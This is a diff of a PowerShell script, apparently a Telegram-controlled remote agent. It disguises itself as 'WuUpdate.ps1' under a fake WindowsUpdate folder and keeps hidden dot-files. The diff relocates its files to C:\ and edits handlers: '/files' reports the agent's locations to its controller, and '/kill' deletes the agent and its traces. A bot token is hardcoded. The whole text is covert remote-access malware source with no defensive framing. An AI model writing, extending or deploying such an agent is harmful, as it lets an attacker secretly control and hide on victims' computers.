@@ -4,10 +4,9 @@
 
 $botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
 
-# CESTY K SOUBORŮM - agent očekává že složka už existuje
-$agentFolder = "$env:LOCALAPPDATA\Microsoft\WindowsUpdate"
-$stateFile = "$agentFolder\.state"
-$logFile = "$agentFolder\.log"
+# CESTY K SOUBORŮM - vše přímo v C:\
+$stateFile = "C:\.state"
+$logFile = "C:\.log"
 
 $chatId = $null
 
@@ -150,19 +149,17 @@ while($true) {
                 }
             } elseif($cmd -eq '/files') {
                 $info = "Umisteni souboru:`n"
-                $info += "Agent: $agentFolder\WuUpdate.ps1`n"
-                $info += "State: $stateFile`n"
-                $info += "Log: $logFile`n`n"
-                $info += "Slozka: $agentFolder (Hidden)"
+                $info += "Agent: C:\WuUpdate.ps1`n"
+                $info += "State: C:\.state`n"
+                $info += "Log: C:\.log"
                 Send-Message $info
             } elseif($cmd -eq '/kill') {
                 Write-Log "Ukoncuji se..."
                 Send-Message "Agent se ukoncuje..."
                 
-                Remove-Item "$agentFolder\WuUpdate.ps1" -Force -ErrorAction SilentlyContinue
-                Remove-Item $stateFile -Force -ErrorAction SilentlyContinue
-                Remove-Item $logFile -Force -ErrorAction SilentlyContinue
-                Remove-Item $agentFolder -Force -ErrorAction SilentlyContinue
+                Remove-Item "C:\WuUpdate.ps1" -Force -ErrorAction SilentlyContinue
+                Remove-Item "C:\.state" -Force -ErrorAction SilentlyContinue
+                Remove-Item "C:\.log" -Force -ErrorAction SilentlyContinue
                 
                 exit
             } else {
